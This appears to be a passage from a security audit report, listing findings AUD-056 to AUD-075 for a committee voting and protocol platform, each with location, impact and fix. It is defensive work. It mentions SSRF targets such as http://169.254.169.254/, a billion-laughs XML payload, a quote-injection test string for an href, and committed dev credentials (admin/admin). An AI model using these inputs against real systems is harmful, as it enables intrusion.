**Impact:** No direct hole (the download endpoint enforces authz independently). Maintainability/false-assurance risk: a future change trusting 'the URL is signed/short-lived' could introduce IDOR; FE TTL caching may silently do nothing.

**Fix:** Rename/document expiresIn as an advisory FE cache hint and correct the docstrings (SignedUrlOut, router.py:5, storage.py:6) to describe an app-relative authz-gated route. Do NOT delete presigned_get_url (live in the PDF module).

#### AUD-056 — README documents a forbidden cast_ballot tool and a 'cast ballots' grant, contradicting the HARD RULE

`low` · `quality` · area: **mcp**

**Location:** mcp/README.md:51, mcp/README.md:61

**What:** The HARD RULE is that an agent can NEVER cast a ballot (no cast_ballot tool; vote.cast never granted). README.md:51 maps votes:write to 'open / close votes, cast ballots' and :61 lists a nonexistent cast_ballot tool. (The auditor's escalation premise is refuted: the scope→permission mapping is hardcoded in oauth.py — votes:write→vote.manage only — and vote.cast is in FORBIDDEN_PERMISSIONS, hard-stripped from every scope; the README has no causal effect on authorization.)

**Impact:** Documentation-integrity defect on the package's #1 invariant: misleads operators and references a tool that does not exist. No security effect (server-side mapping is code-enforced).

**Fix:** Fix README.md:51 to 'create/open/close/cancel/manage votes (NEVER cast a ballot — human-only)' matching votes:write→vote.manage, and remove cast_ballot from the tool list. Optionally note that vote.cast is in FORBIDDEN_PERMISSIONS and never grantable.

#### AUD-057 — Admin-role bypass hardcoded as Role.key=='admin' and duplicated in recipient resolution

`low` · `quality` · area: **notifications**

**Location:** backend/app/modules/notifications/recipients.py:143 (_emails_for_permission), 202-205 (actionable_principal_emails)

**What:** Both recipient resolvers re-implement the admin all-rights rule inline with a literal Role.key=='admin' OR-clause and a hand-rolled permission-holder join, instead of going through the central Principal.has()/RBAC resolver. Consistent today, but duplicates authorization semantics in raw SQL.

**Impact:** Maintainability/correctness-drift hazard: a future change to the admin key, bypass rule, or permission inheritance must remember to patch these two SQL clauses or recipient resolution silently diverges (over/under-notification).

**Fix:** Centralize the admin key as a shared constant and extract a single principals_with_permission helper (RoleAssignment/Role/RolePermission join + admin-bypass) used by both resolvers, aligned with Principal.has().

#### AUD-058 — Auskunft email query accepts arbitrary unvalidated input used as exact CITEXT match and audit target_id

`low` · `quality` · area: **privacy**

**Location:** backend/app/modules/privacy/router.py:198,205,212; service.py:252,330

**What:** /auskunft takes email as Query(min_length=1) with no email-format validation, uses it for an exact CITEXT equality match and as the PII_EXPORT audit target_id. A typo/wrong-format value silently returns a generated empty (but still audited) export, and the audit row records a non-email target_id. Admin-gated (privacy.manage), so no authz/enumeration issue.

**Impact:** Silent empty exports on malformed input and lower-quality Art.30 audit trail (target_id may not be a valid email). No security exposure given the admin gate.

**Fix:** Type the param as EmailStr (or normalize+validate), reject malformed shapes with 422, and pass the canonical email to collect() and the audit target_id.

#### AUD-059 — Protocol read endpoints document a per-gremium assert_can_read scope check that is never executed

`low` · `quality` · area: **protocol-pdf**

**Location:** backend/app/modules/protocol/router.py:78-84 (ReaderDep header comment)

**What:** The ReaderDep header comment claims the read endpoints additionally enforce MeetingService.assert_can_read ('kein Cross-Tenant-Lesen'), but the handlers never call it (grep confirms it appears only in the comment); reads are gated solely by global meeting.manage/meeting.view_all. (The cross-tenant-leak escalation is architecturally impossible today: meeting.manage cannot be a gremium-scoped role, gremium perms never enter principal.permissions, and assert_can_read in livevote does not scope meeting.manage either — it returns all gremien for those holders.) Merges the documentation half of findings [39] and [54].

**Impact:** Misleading invariant: reviewers believe protocol reads are gremium-scoped when they are not. No live security hole; the per-endpoint docstrings are already accurate, only the header comment contradicts them.

**Fix:** Edit the ReaderDep header comment to remove the assert_can_read reference and state the truthful invariant (reads gated solely by global meeting.manage/meeting.view_all, no per-gremium scope). Do not add assert_can_read to the handlers — it would be a no-op for every reachable principal.

#### AUD-060 — ProtocolPatch.markdown has no size bound at the API edge

`low` · `quality` · area: **protocol-pdf**

**Location:** backend/app/modules/protocol/schemas.py:23-26 (ProtocolPatch.markdown:str); router.py:131; service.py:241-245

**What:** ProtocolPatch.markdown is an unconstrained str (no max_length) stored verbatim into a Text column; the PATCH route carries no body_cap dependency, unlike budget/invoice routes. The sanitizer regexes are linear (not ReDoS). In production the general nginx /api/ location caps bodies at 1 MiB, so 'arbitrarily large' is not realistic; the gap is the absence of app-layer enforcement independent of the proxy.

**Impact:** Minor robustness/defense-in-depth gap: input is not bounded at the API edge, so enforcement depends on infra (nginx 1m) or a deep pytex 413 rather than a clean 422; worst case ~1 MiB stored and re-rendered (under the 4 MiB pytex cap). Not a meaningful DoS.

**Fix:** Add Field(max_length=512_000) to ProtocolPatch.markdown for a deployment-independent 422, comfortably under the nginx and pytex caps. Optionally add a body_cap dependency to the PATCH route.

#### AUD-061 — pytex version drift across requirements/README/app and silent monkeypatch guard

`low` · `quality` · area: **pytex**

**Location:** pytex/requirements.txt:4 (1.0.6) vs pytex/app.py:3-4,86 & README.md:3-4 (1.0.0); monkeypatch app.py:73-84

**What:** requirements.txt pins 1.0.6 while app.py docstring/version string and README say 1.0.0. The runtime monkeypatch of _protocol_document._SCALAR_ROWS is version-coupled and correct for 1.0.6 (verified against the wheel) but guarded only by a silent existence check that would no-op rather than fail loud if the private attr were renamed. (The auditor's tie to trust gates/RCE is overstated — the patch only adds two cover-page rows.)

**Impact:** Documentation/version-string drift causes mis-reasoning about which renderer version ships; the silent patch guard could drop the extra title-page rows on a future bump with no error. Quality/maintainability.

**Fix:** Align the docstring/version string/README to 1.0.6 (or read from importlib.metadata) and replace the silent guard with a fail-fast assert hasattr(_protocol_document,'_SCALAR_ROWS'). Add a unit test asserting the two extra labels appear in _SCALAR_ROWS.

#### AUD-062 — No config-time SSRF/host validation surfaced to the admin for webhooks

`low` · `quality` · area: **webhooks**

**Location:** backend/app/modules/admin/schemas.py:318-337 (Webhook URL validators); service.py:786-816

**What:** The runtime SSRF guard is the real boundary (resolves all A/AAAA, blocks non-global, pins to validated IP, no redirects). But the only CRUD-time validation is a http(s) scheme prefix check. An admin can save http://169.254.169.254/ or http://10.0.0.1/ as active with no feedback; every matching event then produces a pending→dead webhook_delivery, and there is no delivery-status read route, so a typo'd/internal URL is opaque to diagnose.

**Impact:** Operational/supportability: misconfigured or internal-target webhooks fail silently with no actionable admin signal and produce dead-letter rows per event. Not exploitable (runtime guard holds).

**Fix:** At create/update, run a best-effort advisory validation reusing assert_allowed_url (with webhook_host_allowlist) and return 400 on a non-global resolution. Keep the authoritative runtime guard. Add a delivery-status read endpoint surfacing last state + coarse reason class without leaking resolved internal IPs.

### ⚪ Info

#### AUD-063 — ZUGFeRD CII-XML fallback parser does not explicitly harden xml.etree against entity/DTD attacks

`info` · `security` · area: **budget**

**Location:** backend/app/modules/budget/invoice_import.py:266 (_parse_cii_header, ET.fromstring with # noqa: S314)

**What:** The tolerant fallback parser feeds attacker-controlled XML (extracted from an uploaded PDF) into stdlib xml.etree.ElementTree.fromstring with a noqa suppressing the bandit warning and a misleading 'trusted self-extraction' comment. ElementTree blocks external entities (no XXE/SSRF) but does not itself block DTD/internal-entity expansion. Empirically refuted on the runtime: libexpat's amplification guard (>=2.4.0, bundled in python:3.13-slim) rejects billion-laughs payloads with a ParseError already caught and converted to NotZugferdError, so no DoS occurs.

**Impact:** No exploitable DoS or exfiltration on the supported runtime; risk would only re-emerge on an ancient libexpat (<2.4.0). The residual concern is purely defensive-coding hygiene (untrusted bytes parsed without explicit hardening).

**Fix:** Defense-in-depth only: parse the fallback XML with defusedxml.ElementTree.fromstring or an XMLParser that forbids DTDs, remove the noqa, and correct the 'trusted self-extraction' comment. Add a regression test feeding a billion-laughs/DTD payload asserting NotZugferdError.

#### AUD-064 — Markdown link renderer interpolates URL into href without quote-escaping

`info` · `security` · area: **fe-security**

**Location:** frontend/src/app/features/meetings/meetings.util.ts:84-88 (inline); sinks meetings.component.ts:1533 + apply-wizard.component.ts:145

**What:** The dependency-free markdown renderer builds <a href="${url}"> where url is validated only by a scheme-prefix safeUrl() and captured by [^)\s]+, which permits a double-quote — the raw " is emitted unescaped into the href, breaking out into a stray attribute. (The auditor's onmouseover PoC is regex-invalid because [^)\s]+ forbids the space; only a bare attribute break-out is possible.) Both sinks bind via plain [innerHTML] (no bypassSecurityTrustHtml anywhere), so Angular's DomSanitizer strips any injected handler at runtime.

**Impact:** No exploitable XSS while output stays behind Angular's [innerHTML] sanitizer. Latent defense-in-depth gap: if this output is ever wrapped in bypassSecurityTrustHtml or rendered outside Angular sanitization, the attribute injection becomes stored XSS authored by a committee member/admin.

**Fix:** Run the captured url through escapeHtml before interpolating into href (or reject urls containing a double-quote/whitespace/control char). Keep Angular sanitization as the second layer. Add a unit test asserting [x](https://e"x=) escapes the quote.

#### AUD-065 — WS cast does not bind vote_id to the connection's authorized meeting

`info` · `security` · area: **livevote**

**Location:** backend/app/modules/livevote/connection.py:237-270 (_handle_cast)

**What:** _handle_cast forwards CastMessage.vote_id to VotingService.cast without verifying the vote belongs to self.meeting_id. A voter connected to meeting A can submit a cast frame referencing a vote in meeting B. VotingService.cast independently re-enforces eligibility on the vote's own eligible_group/delegation and publishes the tally to the vote's own meeting channel, so no escalation or cross-channel leak occurs.

**Impact:** No data leak or unauthorized vote — eligibility is re-checked per vote and the tally goes to the correct channel. The only effect is meeting A's per-connection token-bucket/lock can drive an eligible cast against meeting B (immaterial).

**Fix:** Optional defense-in-depth: assert vote.meeting_id == self.meeting_id in _handle_cast and return an error frame on mismatch.

#### AUD-066 — vote.eligible_group membership can be satisfied by a raw OIDC group string matching a gremium UUID

`info` · `security` · area: **voting-delegations**

**Location:** backend/app/modules/auth/rbac.py:52,112-114; voting/service.py:332; livevote/service.py:1060-1073

**What:** Principal.groups unions raw OIDC group claims (coerced to str) and gremium memberships added as str(gremium_id). The cast gate checks in_group(str(gremium_id)) while the quorum denominator counts only members holding the vote.cast GremiumRole. If an OIDC group claim literally equals a gremium's UUID string (and the principal also holds global vote.cast), they could cast without being in the roster denominator. Requires a hostile/misconfigured IdP emitting UUID-shaped group names — implausible under a trusted IdP.

**Impact:** Theoretical denominator/eligibility mismatch (slight participation-vs-quorum skew) contingent on a UUID-shaped OIDC group claim plus global vote.cast. Cannot occur under a trusted IdP.

**Fix:** Namespace the internal gremium group key (e.g. f"gremium:{gremium_id}") so it cannot collide with arbitrary OIDC claims, and set Vote.eligible_group to the same prefixed form; or resolve cast eligibility via an explicit membership-with-vote.cast lookup.

#### AUD-067 — Secret-ballot anonymity relies on random UUID PK but not on physical row order

`info` · `security` · area: **voting-delegations**

**Location:** backend/app/modules/voting/models.py:119-149; service.py:392-407 (_cast_secret); db.py:43-48

**What:** Secret voting correctly splits identity (voted_marker.voter_sub) from choice (secret_ballot.choice), SecretBallot is timestamp-free, and both PKs are gen_random_uuid(). The only residual channel is physical insertion order: the marker and ballot INSERTs commit in the same transaction, so a party with direct Postgres/WAL access could correlate the Nth row of each by arrival order. Out of the application threat model.

**Impact:** No application-level deanonymization (no endpoint joins voter to choice; tally reads only choice). Deanonymization needs privileged direct DB/WAL inspection plus an external sub+time log — outside the app trust boundary.

**Fix:** No code change required. Defense-in-depth: document that DB superuser/WAL/backup custody is a trusted boundary; optionally bulk-insert SecretBallot rows in randomized order at vote close to break heap-order correlation.

#### AUD-068 — nginx edge omits hardening directives (server_tokens off, HSTS, Permissions-Policy)

`info` · `security` · area: **xcut-deploy**

**Location:** deploy/web/nginx.conf:25-29 (and server/http scope)

**What:** The edge server block sets CSP, X-Content-Type-Options, Referrer-Policy and X-Frame-Options:DENY (good) but omits server_tokens off (nginx version leaked in Server header/error pages) and emits no HSTS or Permissions-Policy. TLS is terminated at the external NPM, so HSTS belongs there.

**Impact:** Minor passive info disclosure (nginx version aids recon) and missing HSTS unless NPM sets it; missing Permissions-Policy leaves browser feature defaults (largely redundant given frame-ancestors none + X-Frame-Options DENY). Low real-world risk behind the HTTPS proxy.

**Fix:** Add server_tokens off in the server/http context. Document that HSTS must be set at the TLS terminator (NPM) and verify it emits Strict-Transport-Security. Optionally add Permissions-Policy: camera=(),microphone=(),geolocation=().

#### AUD-069 — Committed Keycloak client secret and credentials in local-dev realm

`info` · `security` · area: **xcut-deploy**

**Location:** deploy/keycloak/antrag-realm.json:636 (client secret); ~2405-2418 (tester/tester); docker-compose.keycloak.yml:18-19 (admin/admin)

**What:** The imported Keycloak realm hardcodes a confidential client secret for antragsplattform-demo-local plus admin/test-user credentials. The realm is local-only (redirectUris http://localhost:8080), imported solely by the start-dev keycloak overlay marked 'NICHT für prod', and not referenced by deploy.sh or the prod compose; prod uses the real IdP.

**Impact:** No production exposure — the secret authenticates only a localhost dev client against a throwaway dev Keycloak. Noted so it is never copied into a real IdP.

**Fix:** Keep as-is for local dev; optionally add a one-line comment near the secret stating these are local-dev fixtures that must never be reused for a real realm/IdP.

#### AUD-070 — DeadlinePolicy.absolute_at accepts naive (tz-unaware) datetimes, contrary to the tz-aware house rule

`info` · `correctness` · area: **calendar-deadlines**

**Location:** backend/app/modules/deadlines/schemas.py:31,40 (absolute_at) → service.resolve_due_at → Deadline.due_at timestamptz

**What:** DeadlinePolicyCreate/Update type absolute_at as a plain datetime with no AwareDatetime/validator; a naive value flows unchanged into the timestamptz Deadline.due_at and is later compared against datetime.now(UTC). A naive value bound to timestamptz is interpreted with the DB session timezone.

**Impact:** An admin-curated absolute deadline can fire hours early/late if the DB session timezone is not UTC; moot under a UTC DB. admin.deadlines-gated curated input — the one place naive input reaches a time comparison, violating the house rule.

**Fix:** Type absolute_at as pydantic AwareDatetime (ideally a shared aware-datetime base used across schemas), or normalize value.replace(tzinfo=UTC) in resolve_due_at.

#### AUD-071 — If MinIO is enabled but ClamAV is disabled, uploads are permanently quarantined (download 409 forever)

`info` · `correctness` · area: **files**

**Location:** backend/worker/scan.py:48-52; files/service.py:175-176,107-108,131; scanner.py:76-77; settings.py:227-229,302-326

**What:** With storage_enabled true but clamav disabled, uploads succeed and enqueue a scan, but the worker sees scanner is None, logs 'scan skipped' and returns without setting scanned=True. _ready_attachment then always raises 409 'still being scanned'. The file is stored but never downloadable, with no startup cross-config check. Fail-closed (safe) but a silent footgun.

**Impact:** Operational/data-availability: a storage-on/scanner-off misconfiguration yields silently undownloadable attachments indefinitely; the only signal is a worker WARNING. No security exposure.

**Fix:** Add a startup WARNING in Settings._strict_security_warnings when storage_enabled and not clamav_enabled. Optionally introduce a distinct scan_result='scan_unavailable' status so operators/UI see the permanent-quarantine state. Do NOT auto-mark such files clean.

#### AUD-072 — deploy.sh auto-copies placeholder .env.example to .env on missing config

`info` · `correctness` · area: **xcut-deploy**

**Location:** deploy/deploy.sh:26-29

**What:** When deploy/.env is absent, deploy.sh silently cp .env.example .env and proceeds. (The auditor's 'silently insecure bring-up' is refuted: settings.py requires session_secret/magic_link_secret as min_length=16 with no default, so api/worker/migrate fail fast on the placeholder .env, and altcha captcha is inert while ALTCHA_HMAC_SECRET is empty.)

**Impact:** Minor operator-ergonomics wart: a first deploy proceeds with a placeholder .env, but the app stack fails fast on missing signing secrets rather than running insecurely. No security exposure on first run.

**Fix:** Optional: replace the cp block with a hard failure instructing the operator to create and fill deploy/.env. The fail-fast settings validation already prevents insecure bring-up.

#### AUD-073 — Download streams entire file into memory rather than streaming from storage

`info` · `performance` · area: **files**

**Location:** backend/app/modules/files/service.py:194-207 (download_bytes); router.py:215-219; storage.py:71-83 (MinioStorage.get)

**What:** download_bytes calls storage.get() which response.read()s the full object into bytes, and the route returns a Response with the full content in memory — no StreamingResponse/chunked transfer. Peak resident is ~1x file size per download (cap 10 MiB).

**Impact:** Under concurrent committee downloads of large attachments, memory pressure on the single-VM API process scales linearly (~0.5 GiB for 50 concurrent 10 MiB). Auth + per-application read required, not unauthenticated-DoS; bounded operational memory.

**Fix:** Replace the in-memory get+Response with a StreamingResponse over the MinIO get_object stream (return an iterator from storage/service, set Content-Length), wrapping the generator in try/finally to close/release the connection.

#### AUD-074 — DirectMailQueue idempotency _seen set grows unbounded for long-lived instances

`info` · `quality` · area: **notifications**

**Location:** backend/app/modules/notifications/queue.py:45-63 (DirectMailQueue)

**What:** DirectMailQueue records every seen idempotency key in an in-memory _seen set that is never pruned. It is test/DEV-only (production uses ArqMailQueue with Redis/arq _job_id dedup); a long-lived instance would grow without bound and dedup distinct mails reusing a key.

**Impact:** None in production wiring (DEV/test only). Latent footgun if promoted to a long-running sender.

**Fix:** Keep DirectMailQueue strictly test/DEV; if ever promoted, bound _seen (LRU) or drop in-memory dedup and rely on the worker-side arq _job_id dedup.

#### AUD-075 — _PATH_RE error scrubber is over-broad and can corrupt legitimate error detail

`info` · `quality` · area: **pytex**

**Location:** pytex/app.py:90-94

**What:** _scrub replaces any '/'-containing token with '<path>' via r"(/[^\s:'\"]+)+", rewriting legitimate non-path content (LaTeX command fragments like /linewidth, fractions, URL segments) in CompileError detail forwarded to operators, degrading debuggability. The Windows-path bypass concern is theoretical (Linux-only container).

**Impact:** Maintainability/operability: scrubbed compile-error logs lose useful context. Negligible info-leak (internal-only, Linux POSIX paths are caught).

**Fix:** Replace the blanket slash-run regex with a targeted scrub of known container root prefixes only (r"/(?:tmp|app|cache|home|var|usr|root)/[^\s:'\"]*") so legitimate slash-containing detail is preserved.
